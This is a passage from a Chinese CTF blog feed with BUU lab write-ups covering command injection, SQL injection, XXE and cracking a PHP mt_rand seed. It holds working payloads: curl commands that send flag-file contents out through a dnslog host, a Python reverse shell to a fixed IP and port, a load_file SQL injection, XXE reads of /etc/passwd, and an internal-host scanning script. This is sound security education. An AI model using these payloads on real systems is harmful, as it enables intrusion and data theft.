class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=%32%4c%38%57%2f%39%51%51%4d%31%54%4b%49%70%37%66%61%73%6e%50%33%4c%41%2b%59%43%75%33%65%65%6f%47%69%70%6d%68%30%56%6f%49%46%4c%41%3d&amp;shell=curl%20`cat%09/flag`.yae4q7.dnslog.cn</span><br><span class="line">反引号内执行语句，由于ls /只有返回了var一个结果，其他结果返回不了，看其他wp说ls /|base64可以，但是试了一下不行，猜测/flag，刚好出了。</span><br><span class="line">别人的是curl 118.***.***.***/`ls /|base64`</span><br><span class="line"></span><br><span class="line">注意在发送数据时候，若是等一会则说明在解析dnslog地址，若是直接返回，那估计是命令敲错了，而且这种方法有些命令也执行不了，还是服务器香点</span><br><span class="line"></span><br><span class="line">还有一些用tee命令写到文件里面的，下次再试试，记录一下（坑）</span><br></pre></td></tr></table></figure><p><img src="C:\Users\wen\AppData\Roaming\Typora\typora-user-images\image-20230211152640844.png" alt="image-20230211152640844"></p><p>反弹shell</p><p>Python</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import</span><br><span class="line">os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;172.16.154.239&#x27;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/Zero_Adam/article/details/114890384">https://blog.csdn.net/Zero_Adam/article/details/114890384</a></p><p><a href="https://blog.csdn.net/wuyaowangchuan/article/details/114540227">https://blog.csdn.net/wuyaowangchuan/article/details/114540227</a></p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/114853022">https://blog.csdn.net/Zero_Adam/article/details/114853022</a>  （坑）</p><p><a href="https://blog.csdn.net/weixin_39890543/article/details/112989316">https://blog.csdn.net/weixin_39890543/article/details/112989316</a> （坑）</p><p><a href="https://blog.csdn.net/pop364/article/details/106083847">https://blog.csdn.net/pop364/article/details/106083847</a> （buu靶机）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;进入就是一个输入框，搜集信息啥也没有。输入之后url会有 ?url&amp;#x3D;&lt;/p&gt;
&lt;p&gt;一般这种就是路径遍历，ssrf，或者文件包含，</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
    <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019 华北赛区 Day1 Web5]CyberPunk</title>
    <link href="http://van0308.github.io/2023/02/10/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/"/>
    <id>http://van0308.github.io/2023/02/10/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/</id>
    <published>2023-02-10T12:22:47.000Z</published>
    <updated>2023-02-13T14:43:35.857Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>注意不是中文的符号啊 引号 先提交订单，后修改订单地址两次，再查询订单</p><p>payload: address&#x3D;’,<code>address</code>&#x3D;(sql语句);#</p><p>‘,<code>address</code>&#x3D;(select load_file(‘&#x2F;flag.txt’));#</p><p><a href="https://lonmar.cn/2021/02/02/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/#0x03-addslashes">https://lonmar.cn/2021/02/02/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/#0x03-addslashes</a></p><p><a href="https://blog.csdn.net/weixin_45551083/article/details/113576689">https://blog.csdn.net/weixin_45551083/article/details/113576689</a></p><p><a href="https://blog.csdn.net/fmyyy1/article/details/115365517">https://blog.csdn.net/fmyyy1/article/details/115365517</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;注意不是中文的符号啊 引号 先提交订单，后修改订单地址两次，再查询订单&lt;/p&gt;
&lt;p&gt;payload: address&amp;#x3D;’,&lt;co</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>[NCTF2019]True XML cookbook</title>
    <link href="http://van0308.github.io/2023/02/10/NCTF2019-True-XML-cookbook/"/>
    <id>http://van0308.github.io/2023/02/10/NCTF2019-True-XML-cookbook/</id>
    <published>2023-02-10T07:47:30.000Z</published>
    <updated>2023-02-11T02:59:51.188Z</updated>
    
    <content type="html"><![CDATA[<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>进入是登录框，查看源代码发现是传输xml信息，随便填信息然后抓包也发现了xml信息 <user><username>admin</username><password>1</password></user></p><h4 id="尝试进行xxe注入"><a href="#尝试进行xxe注入" class="headerlink" title="尝试进行xxe注入"></a>尝试进行xxe注入</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]</span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">分别读取/etc/hosts /flag 等常见的</span><br><span class="line">读不到，那么尝试读一下源码：（在做的过程中发现报错，可知路径）</span><br><span class="line">file:///var/www/html/doLogin.php  读不到</span><br><span class="line">php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php 读到了，但是没什么信息，利用源码的账号密码登录也没用。</span><br><span class="line"></span><br><span class="line">探测内网主机 /proc/net/arp /etc/hosts</span><br><span class="line">发现有另外一个ip</span><br><span class="line">用http协议访问</span><br><span class="line">http://10.128.253.1 发现报错，尝试进行最后一位c段爆破</span><br><span class="line">最后访问成功得到flag（没做出来，怀疑是buu问题）</span><br></pre></td></tr></table></figure><h4 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h4><p>题目没做出来，利用http访问会很久，然后显示超时链接。</p><p>&#x2F;etc&#x2F;hosts下开两个环境，一个有ip一个没有ip，&#x2F;proc&#x2F;net&#x2F;arp里一个有一个ip，一个两个ip。</p><p>都访问不了。</p><p>贴个网上的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line"><span class="comment"># url=&quot;http://0c8016ed-ef08-4127-ad08-37c2bcce842e.node4.buuoj.cn:81/doLogin.php&quot;</span></span><br><span class="line">rawPayload=<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!DOCTYPE user [&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://169.254.1.&#123;&#125;&quot;&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;]&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;user&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&amp;payload1;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;23&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/user&gt;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>,<span class="number">500</span>):</span><br><span class="line">    payload=rawPayload.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="comment">#payload=rawPayload</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(<span class="string">&quot;#&#123;&#125; =&gt;&quot;</span>).<span class="built_in">format</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp=res.post(url,data=payload,timeout=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(resp.text,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/Article-kelp/p/16026652.html">https://www.cnblogs.com/Article-kelp/p/16026652.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;解题&quot;&gt;&lt;a href=&quot;#解题&quot; class=&quot;headerlink&quot; title=&quot;解题&quot;&gt;&lt;/a&gt;解题&lt;/h3&gt;&lt;p&gt;进入是登录框，查看源代码发现是传输xml信息，随便填信息然后抓包也发现了xml信息 &lt;user&gt;&lt;username&gt;admin&lt;/usern</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
    <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>[GWCTF 2019]枯燥的抽奖</title>
    <link href="http://van0308.github.io/2023/02/09/GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/"/>
    <id>http://van0308.github.io/2023/02/09/GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/</id>
    <published>2023-02-09T14:31:36.000Z</published>
    <updated>2023-02-10T07:10:57.470Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><h4 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session_start() 会创建新会话或者重用现有会话。</span><br><span class="line">$_SESSION — Session 变量，当前脚本可用 SESSION 变量的数组。</span><br><span class="line">rand() 函数返回随机整数。</span><br><span class="line">mt_srand(seed)函数通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。</span><br></pre></td></tr></table></figure><h4 id="PHP-mt-rand函数"><a href="#PHP-mt-rand函数" class="headerlink" title="PHP mt_rand函数"></a>PHP mt_rand函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">产生伪随机数。它产生随机数值的平均速度比 libc 提供的 rand() 快四倍。由可确定的函数，通过一个种子产生的伪随机数。可以通过种子/已产生的随机数来获得接下来的序列信息。有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。</span><br><span class="line"></span><br><span class="line">破解工具：php_mt_seed是一个破解mt_rand函数seed的工具。参数说明：四个参数（高级模式）下，前两个参数表示mt_rand第一次输出的区间，后两个参数表示mt_rand输出的区间。</span><br><span class="line"></span><br><span class="line">link：https://www.freebuf.com/vuls/192012.html</span><br></pre></td></tr></table></figure><h3 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h3><h4 id="Ctrl-U查看源代码（坑）"><a href="#Ctrl-U查看源代码（坑）" class="headerlink" title="Ctrl+U查看源代码（坑）"></a>Ctrl+U查看源代码（坑）</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;#div1&quot;</span>).<span class="title function_">load</span>(<span class="string">&quot;check.php #p1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $(<span class="string">&quot;.close&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">hide</span>();</span><br><span class="line">    &#125;);     </span><br><span class="line"></span><br><span class="line">    $(<span class="string">&quot;#button1&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">hide</span>();</span><br><span class="line">    guess=$(<span class="string">&quot;input&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">   <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">   <span class="attr">url</span>: <span class="string">&quot;check.php&quot;</span>,</span><br><span class="line">   <span class="attr">data</span>: <span class="string">&quot;num=&quot;</span>+guess,</span><br><span class="line">   <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">msg</span>)&#123;</span><br><span class="line">     $(<span class="string">&quot;#div2&quot;</span>).<span class="title function_">append</span>(msg);</span><br><span class="line">     alertmsg = $(<span class="string">&quot;#flag&quot;</span>).<span class="title function_">text</span>(); </span><br><span class="line">     <span class="keyword">if</span>(alertmsg==<span class="string">&quot;没抽中哦，再试试吧&quot;</span>)&#123;</span><br><span class="line">      $(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;alert alert-warning&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>($(<span class="string">&quot;#new&quot;</span>).<span class="title function_">text</span>()==<span class="string">&quot;&quot;</span>)</span><br><span class="line">     $(<span class="string">&quot;#new&quot;</span>).<span class="title function_">append</span>(alertmsg);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;     </span><br><span class="line">     $(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;alert alert-success&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span>($(<span class="string">&quot;#new&quot;</span>).<span class="title function_">text</span>()==<span class="string">&quot;&quot;</span>)</span><br><span class="line">     $(<span class="string">&quot;#new&quot;</span>).<span class="title function_">append</span>(alertmsg);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">   &#125;</span><br><span class="line">&#125;); </span><br><span class="line">$(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">show</span>();</span><br><span class="line">$(<span class="string">&quot;#new&quot;</span>).<span class="title function_">empty</span>();</span><br><span class="line"> $(<span class="string">&quot;#div2&quot;</span>).<span class="title function_">empty</span>();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>发现包含了check.php,直接访问得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">C0WhH1dqUB</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="审计源码"><a href="#审计源码" class="headerlink" title="审计源码"></a>审计源码</h4><p>开启会话后，判断session中seed值是否为空，是则用rand函数生成一个值，再将其作为mt_srand()的种子，之后利用$str_long1和随机数生成一串字符，最后截取前10个字符呈现。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>由于我们可以通过工具进行爆破出种子，那么我们就可以重复操作得出完整的字符串</p><h4 id="解"><a href="#解" class="headerlink" title="解"></a>解</h4><p>由题目选择，工具的模式（四个参数），前两个是第一次输出区间（即题目给的字符串对应的生成过程中的每个随机数），后两个是输出区间</p><p>生成格式脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass_now</span> = <span class="string">&quot;TxnDsJjdHq&quot;</span>;</span><br><span class="line"><span class="variable">$allowable_characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$allowable_characters</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$pass_now</span>); <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_now</span>[<span class="variable">$j</span>] == <span class="variable">$allowable_characters</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> <span class="subst">$i</span> 0 <span class="subst">$length</span> &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//55 55 0 61 23 23 0 61 13 13 0 61 39 39 0 61 18 18 0 61 45 45 0 61 9 9 0 61 3 3 0 61 43 43 0 61 16 16 0 61 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用工具爆破。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">工具下载到Linux中：git clone https://github.com/openwall/php_mt_seed.git  进入目录 make一下，然后使用 </span><br><span class="line">./php_mt_seed 55 55 0 61 23 23 0 61 13 13 0 61 39 39 0 61 18 18 0 61 45 45 0 61 9 9 0 61 3 3 0 61 43 43 0 61 16 16 0 61  后得到不同版本的。</span><br><span class="line">种子得是PHP7.1以上的（找不到哪里显示PHP版本，可能都试一试？）</span><br><span class="line">得到种子：773675551</span><br><span class="line">工具官网（https://www.openwall.com/php_mt_seed/）</span><br></pre></td></tr></table></figure><p>后再用题目脚本来得出字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">773675551</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span> = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$str</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&gt;</span><br><span class="line"><span class="comment">//TxnDsJjdHqtrEByP1KYl   （版本也得是7.1以上的）</span></span><br></pre></td></tr></table></figure><p>最后根据题目post一下就有了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;知识点：&quot;&gt;&lt;/a&gt;知识点：&lt;/h3&gt;&lt;h4 id=&quot;一些函数&quot;&gt;&lt;a href=&quot;#一些函数&quot; class=&quot;headerlink&quot; title=&quot;一些函数&quot;&gt;&lt;/a</summary>
      
    
    
    
    
    <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>[Zer0pts2020]Can you guess it?</title>
    <link href="http://van0308.github.io/2023/02/08/Zer0pts2020-Can-you-guess-it/"/>
    <id>http://van0308.github.io/2023/02/08/Zer0pts2020-Can-you-guess-it/</id>
    <published>2023-02-08T15:02:39.000Z</published>
    <updated>2023-02-10T07:45:23.060Z</updated>
    
    <content type="html"><![CDATA[<p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  